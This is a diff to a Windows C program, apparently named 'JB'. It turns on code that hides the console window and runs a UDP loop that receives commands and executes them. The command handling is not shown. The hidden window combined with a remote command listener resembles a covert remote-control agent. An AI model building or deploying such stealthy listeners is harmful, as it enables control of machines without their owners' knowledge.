@@ -25,14 +25,14 @@ extern char PCName[AUTH_LENGTH]; // PC authentication
 
 void JBinit(const char *arg) {
     // Hide console
-    //HWND window = GetConsoleWindow();
-    //ShowWindow(window, SW_MINIMIZE);
-    //ShowWindow(window, SW_HIDE);
+    HWND window = GetConsoleWindow();
+    ShowWindow(window, SW_MINIMIZE);
+    ShowWindow(window, SW_HIDE);
 
     if (!access("JB.log", F_OK)) { // check if log file exists
         FILE *logFp = fopen("JB.log", "r");
 
-        fgets(PCName, AUTH_LENGTH, logFp);
+        fgets(PCName, AUTH_LENGTH, logFp); // get pcName
         fclose(logFp);
 
         PCName[strlen(PCName) - 1] = '\0'; // trim the \n
@@ -57,6 +57,7 @@ int main(int argc, char *argv[])
 
     // Initialize UDP socket
     if (SockBegin(&tsocket)) {
+        WSACleanup();
         JBlogErr("Couldn't initialize socket server.");
         return -1;
     }
@@ -65,9 +66,10 @@ int main(int argc, char *argv[])
 
     /* ---- Main recieving loop ---- */
     while (1) {
-        if (SockRecv(&tsocket, &recv, sizeof(JBCMD)) < 0) {
+        if (SockRecv(&tsocket, &recv, sizeof(JBCMD)) == SOCKET_ERROR) {
             JBlogErr("Socket error.\n");
-            return -1;
+            SockClose(&tsocket);
+            return -2;
         }
         execCommand(recv);
     }
@@ -75,7 +77,7 @@ int main(int argc, char *argv[])
     return 0;
 }
 
-
+/*
 void hexdump(
     const char *desc,
     const void *addr,
@@ -136,3 +138,4 @@ void hexdump(
     // And print the final ASCII buffer.
     printf("  %s\n", buff);
 }
+*/
